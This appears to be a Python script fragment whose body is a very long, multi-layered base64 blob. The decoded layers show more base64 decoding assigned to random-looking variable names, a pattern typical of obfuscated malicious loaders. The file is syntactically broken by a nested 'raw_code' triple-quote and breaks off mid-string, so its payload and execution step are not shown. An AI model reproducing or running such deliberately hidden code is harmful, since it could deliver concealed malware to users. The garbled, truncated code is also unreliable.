import base64
from time import sleep

raw_code = """
raw_code = """CgpjYXB0aXZpdHlfODE0ID0gYmFzZTY0LmI2NGRlY29kZSgnVmpGYWEwNUhTWGRPVm1SVllteGFiMVZxU205WlZscHhVVzFHYkdKSVFsbGFSVkpUVkRGSmVGSnFUbHBoTWxFd1ZtMHhTMUl5VGtsalJtUm9UVlpzTTFac1dtdFdNVmw0Vlc1R1ZHSkdXbFJaYTFwM1VsWmtjMWRzV2s5V2EydzBWVEkxVDJGR1NYcFZiRkpYWWtkU2RWUlhlRmRqYkhCSlZHeG9hVkpXV1RCV2JHTXhWREZrUjFOc1dtcFRSMUpZVm0xNFlWVkdXblJOVlhSVVVtMVNlVmt3V2s5WFJrcFhZMFpHV0Zac1dsaFdWRVpLWlVaYWNsZHNXbWhOYldoWVZtMXdRazFXVW5OV1dHUlhZV3RLV0ZSV1drdFhiRlY1WkVSQ1ZtSlZjRmhaYm5CSFYwWmFjMk5JU2xkTmJtaHlWakZhUjJOdFVrZFViR1JPVFZWc05GWXllRmRoTWtsNVZtNU9hRTB5ZUZCV2JURlRWbFphYzFkdFJrNWlSbkJXVlcxNGExWlZNVmhsUkVKVlRWWndlbFl3WkV0ak1VNXlaRVpvYUdFeGNIbFdSM2hoV1ZaS2RGSnJaRk5pVjJoWVZGVmFjbVZXV25STlJFWnJUVlZ3V0ZZeGFITlVNVnB5VGxkR1YySkdTbGhaTW5oclkyeHdTRkpyTlZOaVNFSkpWbFprTUZsV1dsZFRiRlpYWWxkb2FGVnNXbmRXUmxwMFpVVjBWMkpWY0VaVk1uaFhWMFpLVjJORVZsZFdSVXBZVjFaa1YyUkdUbkpoUm1ocFlsWktlRlpHWkhkV01sWkhWMjVHVkdKck5XOVZha0pYVGxaU2MxZHJPVmRoZWtZd1ZsZDBORmxXU1hwVVdHaFhZa1p3YUZZeFdrOWtSMVpIVTJzMVYySklRbGRXYkZKSFlUSlJlVlp1VGxaaVIzaG9WV3hTYzFVeGJISmhSVTVPVW14d2VsWXlkR3RVYkVwMFpVWnNXbUV5VVhkV01uTjRVMGRSZW1OSFJsZFdia0pGVjJ0V2ExTnRWbk5WYms1VFlrZG9XRnBYZUZkT1ZscFlZMFZPYWsxcmNEQldSM1J2WVZaS1IxZHNUbFZXYlZFd1ZURmFjMk5XVG5SUFYzUlRZa1Z3UzFadE1UQlVNa1p5VFZoS1dHSlZXbUZhVjNSaFlVWndSbGRyTld4aVNFSkhWRlphVTJGRk1IbGhSazVZWVRGS1VGWkVRVEZTTVZKWllrWldhV0V6UW5oV1ZFSmhXVmRXVjFkWVpHRlNhelZ3V1d4V2MwNUdWWGxsU0U1b1ZqQndXbFZXYUd0V01VbDZZVVZTVldKVVJreFdiWE14Vm14U2MxZHJOVlJTVlc4eFZqRmFVMU14YkZoVGJHUmhVbGRTVmxsclZuZFdiRlYzVm0xR1ZrMVdjSGxYYTJRd1lXMUtTRlZxUmxaTmFsWllWbTE0VDFJeVRraFNiRnBPVmpBd2VGZFdWbUZaVjA1eVRWWnNXR0pHY0U5V2JYUnpUVEZhV1dORmRHaE5WMUo2VjJ0b1YxVXlSWGxoUmxaVlZucEdkbGRXV25kU2JVWkhWRzFzVjJKWWFGaFdNblJ2VlRKR1NGTnVTazlXV0dob1ZteGtUazFXVlhsbFNHUnJVakZhU0ZaSGVHRlZNREZ6VTI1YVYxWkZXbkpVYTFwclpFWktkVlZ0UmxOV00yaFpWMWN4TkdRd01YTldXR3hPVWtaYWNsbHNWbUZXTVZwSVkwWmthRTFFUWpWWlZWcGhXVlpLYzFkdWNGcE5WMUpRV2taYWQxSnNXblJoUm1Sb1RWaENNbFpzWkRSaE1VbDRWMnRrVkdFeWFGaFpiWFJMWTBaYWMxZHRSbFJOVmxZelZtMHhNR0ZzU25OWGEyaGFUVVp3VUZsV1drOVNiRTV5WTBaa1RtSnNTazFXVkVKaFZqSk9jMk5GV21oU2JGcHZWRmQ0UzFkR1pGVlNiVGxVVFZad1NGVXlkSE5WYlVwSVZXeHNWMkpVUm5aV1YzaHpZMVpPZEU5WGNGTk5SRVV5VmpKMGExSXhXa2hTYWxwcFVsZFNXVmxyWkc5a2JGWjBUVlYwV0ZKdFVqRldNbmhoVkcxS1JtTkdTbGRpVkVJeldsVmtTMUl4WkZsaVJsSm9Za1p3ZVZadE1IaE9SbVJYWWtaYWFGTkhVazlVVjNNeFRVWlJlRlZyVGxkU1ZFSXpWR3hvUjFadFZuSmpTRXBoVm5wR1IxcFdaRk5TVmxwelZHeE9XRkpWY0V4V01XUXdZVEpKZUZwSVVsUmhNbWhRVm14YVlWWkdWblZqUm1SVFZtMTRlRlpIZEU5aVIwcEhWbXBPV0dFeWFETlpWM040WkZad05sTnNhRmROTVVwVlZrY3dlRlJ0Vm5SU2EyeFVZbGhTVDFacVRtdE9iR1JWVTFob2EwMVZjSHBXTVdodlYwZEdObEp0YUZkaVIyaEVXWHBHWVdSRk5WZFViRTVYWWxaS1dWWldaRFJXTWtaV1RWVm9iRkpHV2xoVmFrNU9UVlpzTmxKc1dteGlSMUl4VmtjeGIxVXlTbkpTV0d4WVZtMU9NMVJzWkZKbFZsSlpZMGRHVkZKVVZtaFdha0pyVGtaT2MyRXphR2hTVkd4aFZtcENkMU5HVlhsTlZ6bFlVakJXTmxWWGNFOVdNa3BaVkZSR1dtRnJXbnBhUlZwUFkyc3hWMk5IYkZkU00yZzFWbXBLZDFNeVVYbFZhMlJWWWtkb1ZsbFVTbTlXVmxWM1YyMUdWVkp1UWxoV01uUlBWVEZLZEZWcVJscE5SMmhvV1ZSQmVGZFdSbkpXYkdSWFlrWndlVlpzWTNoU01sSkhZMFZhVDFZd1dsbFZhazV2VGtaYVYxZHRPVlJOYkZwWVZXMTRiMVJzWkVsUmJVWmFZbGhTVEZWNlJtRmpWbEp6V2taV1YySkdXWHBXYWtreFlqRlplVkpZY0ZaWFIyaG9WbXhhZDJOc2JIUk5WazVVVW14d01Ga3dXbUZVYkZwWlVXeG9WMDF1VW5KWmVrWlRaRVpTY2xwR2FHaE5NVXBVVmtaa2VrMVdVbk5YYTJoUFZsaFNWMVZ0TVZOTlJsVjVUbFZPV0dKR2NGbFpWVkpIVjIxS1ZWSnNhRnBXVm5CWVZqQmtVMU5YUmtkV2JXaE9WbGhDUzFacVJsTlRNVWw0V2toT1dHSkhVbkJWYkZwaFZqRmFjVk50T1ZOaVIxSXdXa1ZrUjFkR1duUlZhM0JXVm5wV1NGbFhlR0ZXVmtwelZHeGthRTF0YUVWWFYzQkxWVzFSZUZadVVsTmlSMmh2VkZaV2QxVnNXWGxqUlhSUFVsUldNRlpHYUhOVlJscDBWV3hvVlZaV1dtaFdWVnB6WTJ4d1NGSnNVbWxXYTI5M1ZrWmFhMk14VlhkTldGSm9VbTVDVjFwWGRHRlhSbEpYV2taT2FtSkZOWGhWYlhoUFlWWktWVlp0UmxoaVJuQjJWV3BLVTJNeFpITmFSbHBwWWxkb2VGWlhjRWRrTWxKWFlraFNUMVpYVWxWWmJGVXhUVlpXV0dWSVRtaE5WbkJaV1ZWak5WWnNXa1pqUkU1YVpXdHdURlp0ZUdGa1YwcEhXa1UxVjFkRlNtOVdiWGhyVFVaVmQwMVZaRk5YUjJodlZXdFdTMWxXYkhOaFJVNXJWbXhhV1ZwVlpEQmhSMHBXVGxoc1ZtSlVSblpaYTFwTFYwZFdSVlpzV214aE0wSnZWbGR3UjJReVRYaFVia3BPVm14YVdWVnNhRU5XUmxsNFYyMTBhazFWTlZoWk1GWnZWMGRLYzJOR1dsVldiRlY0VmtWYVYyUkhWa2hTYld4cFZsWlpNVmRXVm1GU01WcEhXa1ZvYkZORlNsbFdhMVpMWVVaU2RFMVdaRlJTTVZwSFdsVmFhMVV3TVhWYU0yaFlWak5TYUZaVVFURlRSbFp5V2tkc1UwMXRhRlpXUmxKSFV6Rk9SMXBJU21GU1JrcFRWRlpXWVZkV1draGpSMFpvVWpCd1dWcFZWbk5aVmxwelYxaGtWMUl6YUZCVmFrWjNVbXM1V0dWR1RsZE5NbWhMVm0weGQxUXlVWGhTV0docFRUSlNWMWxyVm5kWlZteHpWVzVPVGxKc1dUSlZNbmhQVkcxS1JsWnFUbFZpUm5CWVdWVmFZV05zWkhOVmJHaFhUVEZLVFZaVVJtdFZNVmw1Vkd0c1dHSkdjRTlVVlZaM1RWWmtXR05GVGxaTmExcFpWbTE0YTFWdFNrZFhiVGxhWWtkb1JGWlhlR0ZTYlVaSVVtMW9WMkpXU2toV2EyUTBWREpHVjFkc2JGSmlia0paV1ZkMFlWVkdXbGRYYkdSWVZtdHdlVlpITVhkaFYwcEhZMFpDVjJGclNuWlZha0V4WkVaS2MxZHJOVmRpVmtwNlZtMDFkMVl3TVVkWFdHUllZbTFTVlZWdE1WTlhWbEY0V2tWa1YxSnNjRmxhU0hCRFZqRmFjMk5HVWxWV00yaG9WVzF6TVZkSFZraGtSbVJYVjBWS1NGWnRlRk5STWtsNFZHNU9hbEpzY0ZoWmEyUnZZMnhXY1ZOdE9WUmlSMUpZVjJ0Vk5XSkdTblJWYTJSYVlURmFNMWxYYzNoalYwcEhZVWRHVTAweFJYZFdiRlpyVXpGWmVHTkZaRmhpUlRWVVZtcEtiMVl4V1hsbFJscFBWakJzTkZkcmFGZGhWa3BIVTJ4T1ZWWkZOVVJaTVZwWFRteFNjbVJIYUZkaVZHc3hWakowWVZZeFZYbFNXR2hVVjBkb1YxWnJWbmRYUm13MlUydGthbUpWTlVkV1Z6RnZWRzFLZEZvelpGZE5WbkIyVldwR1NtVkdVbkpYYkdob1pXMTRhRlp0Y0VkVE1VVjRZMFZhV0dFd05YRldiVEV3VFRGYVNHVkZPVmRXYTNCNVZqSjBZVll3TVVoVWFsSmFWbXh3YUZwR1pFZFNNVlowWWtaT1RsWnRPSGxXYlhSclRVWk5lRkpZYUZWaE1uaFZXV3hTYzFac2JISldibVJzVW14d2VWWXlNRFZXUjBwSVQxUldWbUpZYUhwV01GcHJVbXMxV1ZGdFJsZFdNVWw2Vmtaa05GVXhaRWRXYmtaWVlsVmFWVlZzYUVOVE1WcFlZMFU1V2xadGVGaFhhMXB2Vm0xRmVtRkdiRmRoYTI4d1ZGZDRZVlpzY0VkYVJtUnBWbXR3V0Zkc1ZtcGxSMFp6VTJ4a2FsSlVSbGhaYkZKWFRURldObE5yWkZkaGVteFhXV3RhYTFSc1duTmpSRUpZVm14d2RsbDZSbk5YUmxwelYyeFNhV0pJUW1oV1JsWnJUa1UxUjFwR1pHRlNiVkpaVlcxMGQxTldiSEpXYlRsYVZteHNNMVl5Y0VOV2JGbzJVbTVLV2xaNlJreGFSbHBIWTIxV1IxTnNaR3hpUm5BMVZqRmFZV0V4VVhoU1dHaFlZa1p3YzFWcldrdFdNVkpWVVc1a1dHSklRbGRXTW5oclZtMUtWbFpxVmxkTmFrWjZWbGQ0V21WSFRrWlZiR1JYVWxoQ1VWZFdWbUZWYlZaelZtNUtXR0pHY0hCWlZFWjNaV3hrYzFwRVFsZE5WMUpaVm0wMVMxUXhXa1pUYkd4YVlURmFhRlJYZUdGak1XUnpWR3hXVTJGNlZYZFdSM2hoWkRGYWMxZFlaRmhpVlZwWVdWUkdZV05zVm5GVGJHUlRUV3RhU2xaSE1UQlVhekZaVVdwV1YyRXhXbWhWYWtwVFUwWk9kVlpzVG1sU00yaFZWbTF3UjFsV1ZYaFdiRlpUWWxWYVZGUlhkRmROTVdSeVZXdE9WMVl3Y0ZaWldIQkhWMnhhUms1VlVscFdNMmhZVlRGa1MxSXhaSFJrUm1SWVVtdHdWMVpxUm1GV01ERklWR3RrVlZkSVFsZFpiRlpoVmxaV2MxVnNaRlJXYkhCWldsVmtNRlpHU25SVmJuQmFUVVpLV0ZsV1ZYaFdNVTV5Vm14a1RtRnJTVEJXYTFwaFpHMVdWMVZ1VGxKaVZWcHZWRlJLYmsxR1dsaE5WRkpwVFZWd1dGWXlOVXRVTVZwVllrWlNWVll6VFhoWFZscGhVMFV4V0dSSGNFNVdiWGN4VmtaYWEwNUhTa2hUYkZaWFlUTm9hRlZyVm1GV1JteHhVbTFHVkZKVVZscFpWV1EwVmpKR05sWlVRbGhXYkZwb1drUkdSbVZIUlhwYVJscHBVMFZLZDFaWGVHRlRNVTE0Vmxoa2FGSllVbGhVVjNoaFYxWndSbHBJWkZwV1ZFWlhWakkxVDFsV1duUmhSRTVWWWtkU1QxcEVSazlqTVU1MFlrVTFhVmRIWTNkV01uUlhZVzFXUjFSclpGaGhNbWhXV1ZkMGQyTldVbFpoUms1VlZteGFlRlZ0TURWV1ZURldZa1JTV21FeFZYaFphMlJMVjFaR2RHRkdhRmRTVkZaUlYydFdZVk50VVhoVGJsSnJVbXMxVkZsVVFuZFpWbHB5Vm0xR1YwMXJNVFJXVm1oelYwZEtjMU51UWxwaE1WcDVWREZGT1ZCUlBUMD0nKS5kZWNvZGUoInV0Zi04IikKQ0FERElFXzM3NSA9IGJhc2U2NC5iNjRkZWNvZGUoJ1ZqRmpkMlF5VmtkU1dHeFRWMGhDVTFsclZtRmpSbXgwWkVoa1ZGWnVRbGxVYkZZd1ZqQXhXR1ZJYkZoaE1WcFFWbXBCZUZKc1pISmxSbVJvVFZoQ2IxWnRkR0ZTTWsxNFZHNUtUMVpyTlU5V2JGcDJaV3hhV0UxSWFGVk5SRVo2Vmtab2QxVXlTa2RqUjBaYVlrWmFNbHBYZUdGU2JIQkdaRWRzYVZJemFGcFdha2t4WkRGWmVWTnJhR3hTUlRWaFdXdGFkMlZzVW5OWGEzUlhZbFUxUjFZeWVFOWhWMHBYVTJwV1dGWnNTbEJaYWtaR1pVZEtTVlZzYUdsaVZrcFlWbFJDVmsxV1NYaGlTRVpUWWtVMVVGVnROVU5OUmxGNFZtMUdWbUY2UmtwWlZWcEhWbTFLV1dGSGFGWmlXR2hVVlRGYVMyTldSblJqUlRWcFlsZGtORlpzVWtkV01VMTVVMnRrVkdFeWVGZFphMlJ2VjBac2NsZHVaR3RTYkZwNVZqSjBNR0Z0U2toa1JGWlhUVzVvYUZaWGMzaFhWa1p4Vkd4YWFWZEdTbEZXYlhCTFZXMVdSMVZ1VW14U2JGcFlWRlphZDFSR1pGaGxSM1JwVFZad1dGbHJXbXRoVms1SFkwaEtXbUpHV21oVWJGcFhWMGRXUmxSc1ZtbFdWbkJaVm10amVFMUdXbkpOVldob1UwaENZVlp1Y0ZkTk1WcEdWMjVPVjJGNmJGcFZWekUwWVVVeGRXRkdhRmhXYkhCWVZHdFZlRkl4Vm5KaVJrcG9Za2hDVmxkWGVHRlRNVTVYVm01U2JGSnRVazlaYTFaM1pWWndWbUZHWkZaTlJFWjRWbTF3UzFadFZuSlhiRUpXWWxSR1RGbDZSbE5qTVU1MFkwZHNhVlpyY0VWV01uUnFaVVV4U0Zac1pGZGhNWEJQVm10YWQxZEdiSE5WYmtwT1VteHNORmRyV2s5aFZrcHlZMFJHV2xaWFVucFpWRXBMWTJzMVZtTkhSbE5XTW1oUlYxZDBhMUl4U1hoVmJrcG9VakpvVkZac2FFTlpWbVJ5VjIxR1ZFMVdTbGxXYlhodlZVWmFXVkZzYUZWV2JIQk1WbXhhVjFaV1VuSmtSbWhYWWtoQmVGWldaREJqTVZwWVUyeFdWMkpzU21GV2FrNVRWRVphY1ZKdFJtcGlSMUl4V1RCa2QxWXdNVVZXYXpWWVlUSlJNRlpVUVRGU01YQkdZVVpPYVZKVVZuaFhWM2h2VldzeFYyTkdXbUZTUlVwd1dXeFdWMDVHV2xobFIwWllVakJ3V2xaWGVITlhiRnBZWVVST1ZWWkZXbGhXYlhoM1UxZEtSMWRyTlZkV1dFSk1WbXBLZDFNeFNYaFZhMlJoVWxkNFYxbHRlRXRqVmxsM1ZtMUdWV0pJUWtsYVZWWXdZVmRLVm1ORVFsZGlWRVV3VmxkemVGSXlUa1ZYYlVaVFZteHdTVmRZY0VkaE1XUkhWVzVTYUZKc2NFOVdiRlozWlZaYVZWSnRkRmROYXpWWVZqSTFUMVpIUlhoVGJrNVdUVVphVEZSV1duSmtNVnAxVkd4S2FWSnJjRWxYVjNSWFdWZEdWazFJYkd4VFJWcFlXV3hvVGsxV1drZGFSbVJZVW1zMWVWbFZXbTloVmtwVlZtdGtXRlpGV25aVmFrcExWakZTZFZac1dtbFNiSEJhVm0xNFYxbFdTbk5pUmxaVVlXeEtXRmxyV21GTlZtdDNZVWQwYVZJd2NIcFphazV6VmpGS1JsZHVTbFZXVm5BelZtMXpOVmRYVGtkYVIyeFhVak5rTTFZeFdsZGlNVTE0VTFoc1ZWZEhlRlJaYkZKelYxWlZkMWRyZEZSV2JYaDZWbTAxVDJGc1duSmpSbXhYVWpOUmQxbFhNVXRTYkdSWldrWndhR0Y2Vm5sV1YzQkxWakpPY2sxV1dsZGlTRUpQVkZaYWQxVXhXbGRWYXpsWFRWZFNlbFZ0ZUc5aFZrcHpVMnhPV2xaRmJ6QldWRVozVTBVMVZtUkdhRk5OUm5CS1YyeFdiMVV4V25KTlNHUlVZVEo0V0ZSVlduZGxiRnB6V2tWa2ExSnNjREZYYTJSdlZHc3hWbU5GVWxkTlZrcElWMVphYzFZeFpITmlSbHBwVWpGS2VWWlVRbUZUTVdSSFYxaHNUbFpHU2xsWmEyaERVMFpXZEdONlJsZGlSWEJhVlZkMFUxZHRTa2RYYm5CWVZteHdhRll3WkU5VFIwNUhXa1prVGsxRmNFcFdNVkpIVmpGWmVGTllhRk5pUjNodlZXcENZVmxXYkhOWGJVWllZa1phZVZsVldtdFdiRnB5WTBWc1ZXSkdWalJXTUZwYVpXMUdSMkpHY0ZkbGJGcEZWa2Q0WVdFeFRraFNhMXBwVW1zMVdGbFVRbmRXTVdSVlVtMDVhazFFVmxoV01uUnJWbGRGZWxGdVFsWmlSbG96VmxSR1YyTnNaSEprUjJoWFRWWndTVlpVU25wbFJteFhWR3RvYkZJd1dsaFpiRkpYVjBaU2RFMVZOV3hTYlZKNVZUSXhSMkZGTVhSYU0yeFhZV3RLZGxscVNrOVdNV1IxVkcxc1UxWllRbHBXVjNoV1RWZFNWMWRyWkdGU1JVcFBXV3RhYzA1V2JISmFTRTVYVmxSR1NGWXlOVWRXTWtwWllVaEtXazF1YUVoV2JYTTFWakZPYzJOR2FGTk5NazR6Vm14a2QxRXhXWGhUYTJSWVlURndjMVZxVGtOVk1WcHhWRzA1VDFac2NIaFZiVFZQVjBaS2RHVkliRnBOUm5CSVZtMTRXbVZ0UmtkalJscE9ZV3RXTTFaSGRHRlhiVlpZVld0c1dHSllVbGhaVkVKMlRVWmFXRTFJYUU1U2JFWTBWbTEwYzFadFNuUmxTRVpXWWxSR2RsUnRlSGRXTWtaR1ZHeGthVlpVVlhoV2JHTjRVakpHYzFkc1drOVhSMUpZV1ZSR2QxUkdXa2RYYXpWc1ZqRktTbFZ0ZUdGVk1sWjBaVVZXVjJKR1NreFdSRXBQVmpGU2NsZHRjRk5oTTBKb1ZtMTRZVk14VVhoWGJHUlhZa2RTVjFscll6Vk9WbVJ5V1ROb1YxSnNjRmxaVldoM1YwZEtWVkp1V2xwV00yaG9WbTE0VjJOc1VuUmhSbVJYVFcxT00xWXllR3ROUlRGSVVtdGtWbUpyTlZoWmJUVkRWbXhzYzFwRVVteGlSbHBXVlcwd05WWXhXWGROVkU1VlRWZFNkbGxyWkVaa01XUjFWVzFHVjAweWFGVlhWbFpoWVRKTmVWSnJiR2hTYkZwd1dXeG9iazFzWkZobFIzUk9VbXMxV0ZaWGRHOVZNa3BWVm14c1YyRnJjRlJXUjNoclYwZFdTRTlYY0ZkaWEwbzJWMVpXYTFJeVJuSk5WVlpYWVhwV1lWcFhkR0ZVUmxKWFYyeHdiRlpzU2pCWmEyUTBZVlphY21ORmRGZGlSMUYzV1ZSR1UxTkdUblZUYkZab1lUQndkMVp0TVRCVE1XUnpZMFZXVkdKVWJIRlVWbWhEVFVaVmVVMUVSbGhTYlZKSVdXcE9hMWR0Um5KalJYaFZWa1Z3U0ZacVJsTmtWa1p6WTBVMVRsWllRbEZXYkdOM1pVZEplRnBHYUZSaVIzaFZXVzEwUzJOR1ZuTldibVJTVFZaYWVsWnRjRk5oUlRGWFlrUldWV0pHV2xoWlZFWkxZekZPZEdGSFJsTmlTRUpGVmxkMGExVXlUbk5UYmxKVFlsZG9jRlZ0ZUhkTmJHUnpWMjA1YTAxRVJucFdWM1JyVjBkS1ZsZHNiRlppYmtKNldrZDRZV05XUm5KYVJsWnBVbTVDV0ZkVVFtRmlNVnAwVWxob1dHRXhTbGRVVlZwV1RWWmFTRTFXWkd0V2JWSjVXbFZrTUdGV1NYaFNhbEpYWVRKTmVGWnFSazlrUmxaeVYyczVXRkpVVmxkV1ZFSnJWVEpXVjFkWVpHaFNiVkpQVm0xMFlXVldWblJqTTJoWFlrWndXVnBWWkVkV01rcEhWMVJDWVZKV2NETlZNVnBUWXpGR2RHRkhiR2hOTUVwR1ZtcEdZVll5UlhsVWJsSlVWMGQ0VmxsclZrdGpSbFowWTNwR1UxSnVRbGRXYlhCVFlWWlplRmRzY0ZaaVdGSllXV3RrUm1ReFpGbGhSbHBvWVhwV1dWZHJVa2RWTWs1MFZHdHNWMkpWV2xsVk1GWkxUbFpaZVdWSFJsTk5WbkJJVm0wMVMxbFdTbkpUYkZKYVZrVkthRlZ0ZUdGWFIxWklVbTFzVG1GNlZtRldWekF4VkRKRmVWTnVTbWxOTWxKaFdsZDBkMVZHV25OWGJVWllVbFJXVjFsclpEUlZNVnBWVm01a1YyRXhXbWhXYWtaTFl6Sk9TVk50ZEZOaWEwcDRWMWN4TUZsV1dYaGlSbWhyVW0xU2NGVnFRbUZsYkZaMFpFYzVXbFpVUm5sWk1GVXhWakZLUmxOdVdsWldSVnBNVmpCYWQxTldaSE5UYXpWVFRUSm9XVlpzVWtwbFJsVjNUbFprVmxkSFVuQlZiR1J2WVVaWmQxWnRSbXhTYlhjeVZXMDFUMWRIU2taalJFSlhZbGhvUkZsVldrcGxWMUY2WTBaa1RsSnVRbFZYV0hCSFl6SlNTRlZyYkZkaVIyaFlWRlJDUzFWV1duRlNiR1JUVFd4YVNGa3dhRk5oTVVweVkwaE9WazFHVlhoVVYzaGhVbXhhV1dGSGNHbFdWbkJoVjFSQ1UxSXhWbk5hUldoaFRUSjRZVmxyV2xabFJuQlhWMnRrV0ZadFVqRlphMXBUVmtaS2RWRnRhRmRXUlVwMldrUkdhMWRHU25OaVIwWlRZa1Z3VjFkWGRHdGlNVnBIVjJ4b1RsZEhVazlaYkZVeFpWWlplVTFYT1ZkV01IQkpWbGMxUjFZeVJuSlhiRUphWVRGd01scEVTa2RTYkhCSFdrZG9UbEp1UVRGV2JYUnJUVVpWZVZadVVsWmhNbmhWV1ZSQ2QxZEdVbFpXYlVaVFZtMTRlRlpIY3pWVWJVcFdZMFp3V2xaV2NIWldNbmhhWlVaa2NsUnRSbGRXTVVvMlYxWmFhMVF4V25SU2ExcHNVakpvV0ZacldtRk5NV1J5V1hwR1ZFMXJXakJWYlhoelZqSktSMWR0YUZaaGEwb3pWVzE0WVdSRk5WWmFSbHBYVFZad05WWlhNSGhrTVZwelUyNUtWR0Y2UmxsWlYzUkxaR3hzVmxwR1RsUlNiSEI1VjJ0YWQyRldTbFpqUkZwWFlsaENSRlY2U2xOV01rcEhZa1prYVdGNlZsbFhWbEpMVFRKV1YxcElUbGhpVkd4elZXcEJlRTVXYTNkV2JHUlhUV3RXTmxaWGVGZFdNVXB6VjJ4b1ZtRnJjRXhXYlhoVFpGWk9kR05HWkZkU1ZtOTNWbTEwVjJFeFdYbFViazVXWVRKU1UxbFhkSGRXUmxKWVRWUlNUMVp0VWpCVWJHUkhZV3hLY2xacVZsVmlSbkF6VmxSS1JtUXlUa2RoUjBaVFlraENNbFpyVWtkVU1XUkhVMjVTYWxKc2NGaFdha3B2VkZaYVYxZHRSbEpOVm5CWVZqRm9iMVZ0U2taalJsWldZbGhTTTFWclduSmxWMDE2WVVaYVYySldTWGhXYlRCM1RsZEdXRk5yWkZSaWJIQllWV3hhZDFkR1drVlNhMlJyVW10d2VWUXhXbUZWTVZwMFQxUlNXRll6UWxCVmFrWnJVMFpLY21GR1pHaGhlbFpYVmxSQ1YxTXlUbk5oTTJoWVlrVTFiMVZ0ZUVkT1JscDBZek5vVjAxRVJrZFdNbkJMVmpKS1ZWRlVSbHBOVm5CTVZUQmFUMlJIUmtoaFJrNU9ZbGRuZDFZeFpEUlpWazE1VW14b1ZtSnJOVmRaVkVFeFZURnNWVlJ0T1ZSTlYzaFlWbXhTUjFaR1NYZFhiR2hYVmpOb1JGbFZXa3RqYkdSellrWmFUbUZyV205WFZFSnJWREZPV0ZKcmJGVmlWVnBVVkZSR1MxWldaRmRXYlhSVVRWVnNORlV5TlZkV01rVjVZVWhLVlZaRmNIWmFSbHBoWkVVeFdHUkhjRmRpVkdzeFZteGpNV0l4YkZkVFdHaHBaV3RhYUZWclZrWmxSbEp5VjI1S2JGWnRVbnBWVjNodlZqRmFWVlpyZUZkV00yaG9Xa1JLUm1WR1VuVlRiR1JvVFZoQ1dsWnRjRWRaVjFaSFYyNU9hRkpVYkhOWmJGcExaRlpXUjFWWVpGRlZWREE1JykuZGVjb2RlKCJ1dGYtOCIpClBMQU5LXzgwNCA9IDI0ODY1MwpUUklNTUVSXzk2MyA9IGJhc2U2NC5iNjRkZWNvZGUoJ1ZqSjBZV0l4VlhsU1dHaHBUVEpvV0Zsc1VuTmpWbXh5V2tjMWJHSkdjRWhXYlhRd1YwZEtTR1ZHY0ZkV00wNDBXVlJCZUZkSFZrVlNiR1JUVFRBd2VGWlhjRXRVTVVsNFZHNUdVbUpIYUZoV2JUVkRWVlpaZUZWclNteFNWRlpZVjJ0V1lXRkdUa1pUYmtaVlZsWndNMWw2Um10alZrNXhWV3hXVGxac2IzaFhWRUpyVGtaV2MxZHNiRlpYUjJoaFdsZDBTMDB4V25STlZtUnJVbFJzV0ZaSGVGTmhWbVJJV2tSYVYySllVbGhaZWtaVFUwWldjMkpIYkZSU2EzQlZWa1pTUTFNeFZYaFdiRlpUWVhwc1VGWnFRVEZXTVZsNVl6Tm9WMDFXY0ZsYVZWcFRWbTFHY2xkdGFGZFdSVm96V1hwS1QxTldjRWhsUms1T1VtNUNTRll4V21GaE1rMTVVMnRrVkdFeGNGVlpWRUozWXpGYWNWRlVSazlTYlZKNVZtMXdRMVF4V1hoU2FrNWhVbFpLV0ZsVVJrdFhWMFpKVlcxR1UySkdXVEJYYkdRMFl6SlNSMk5GYUZOaVYzaHdWakJXU2sxR1pGZFdiR1JVVFVSV2VsWlhkRzloUmtwelUyeGtWbUZyY0haYVYzaHpWMGRPTmxac2NGZGlSbGt3VmxaamVGSXlSWGxUYms1WVlsVmFXRmxyWkc5Tk1WWnhVbTVrYTFZd05VWlZNakZIVmpGa1NHRkdRbGhoTWxFd1dYcEtTMVl4VGxsaVJrNW9ZVEZ3VjFadE1UQlpWbVJYVjFob1YySnJOWEZWYlhSM1UwWlplVTFWWkdoU01GWTJWVmR3UjFZd01VZGpSMmhYWWtad1UxcFhlRk5rVm1SelZXMW9UbUp0YUU5V2JYUnJUa1paZDAxWVRsTlhSMmhvVlRCa1UxWnNVbFpoUlU1WVZteGFNRnBWWkRCV1JrbDNUbFJDVmsxdWFFaFdhMlJMWXpGT1ZWSnNaRk5sYTFZelYxZDBZVk14VGxkU2JsWlZZa2RvV1ZVd1ZrcGxWbVJ6Vm14a1QxSnJjSHBWTVdoM1lWWkplV1ZJVGxwaE1taEVWRlJHVjFZeVJrZFVhemxYWWtoQ1lWWnRNWGRXTWtwSFYyNUthbEpXY0ZoV2ExWmhaR3hhY2xkc2NHdE5SR3hhVmtkNGQxUnNTblZSYkZKWVZrVmFXRlZxUVRGak1rNUhZa1phYVZKWVFsVldSbVF3WkRGVmVGZHJWbFZpYlZKWVdXdGtVMDFHV1hsa1JrNVdZWHBHU2xsVlZUVldiRnBHWTBod1lWSjZSbFJhUmxwM1VteFdkRkpyTlU1aVJYQkZWako0WVZsWFVYZE5WV2hVWWtkNGFGVnJWa3RaVm14VlVtNWFiRkp0VWxoV01qVlBZVlV4Y2xkc2FGZFdla1l6V1ZWVmVHUkhSa1ZXYkZwT1lXdGFUVmRzV210VE1WbDRXa2hHV0dKWGVGaFpiR2h2Vld4a1YxbDZSbFZOYTFwNldXdGFhMWRIU25KalJsSlZWbFp3TTFZeFduSmxSbkJKVkcxd1RtRXhXWHBXYWtvd1ZERmFTRkpxV2xOaWEzQllXVlJLVTAweFVsZFhhemxZVWxSc1dsWlhNVzlXTWxaeVYyNXNXRlp0VVhkVWExcFdaVVpLYzFkc1ZtbFhSa3B2Vm0wd2VHSXlUbk5YYTJSWFlsaFNjRmxyWkRCTk1WcDBZMFU1YUZadFVrbFpWVlUxVjIxRmVHTkljRnBpVkVaVFdrUkdWMlJYVGtoa1JUVlRWbTVCZVZadE1UUmlNVWw1Vkd4a1ZtSkhVbFZaYTFaM1YxWldjMkZHVGxoV2JIQkdWVzAxVDFaVk1WaFZiR3hXWWxoTmVGWnNWWGhYUjFaSlVXeGFUbUZyV2xWWFZ6QjRWREZaZVZKclpGSmlSbHB3V1d4a2IxVldXbGxqUlU1WFRVUkNORlpYZUc5aGJFcFlaVWhLVm1KSFVuWldWVnBoVmxaS2RGSnRjRTVXYmtKSVZtcEplR1F4WkVoVGExcHBUVEpTVjFSWE5VNWxSbFp4VW14T1YySldTa2RYYTJSM1lWWktjbUpFVGxkTlZuQlhWR3hhYTFJeFVuVlRiRUpYVmpOb1YxZFdVa3RPUjFaSFkwVmtXR0Y2YkU5WmExcExaVlpTYzFac1RsWk5SRUkyVlZkNFYxWXlSbkpUV0dSaFVsZFNVRlZ0YzNoV01rNUhVMjFzYVdFd2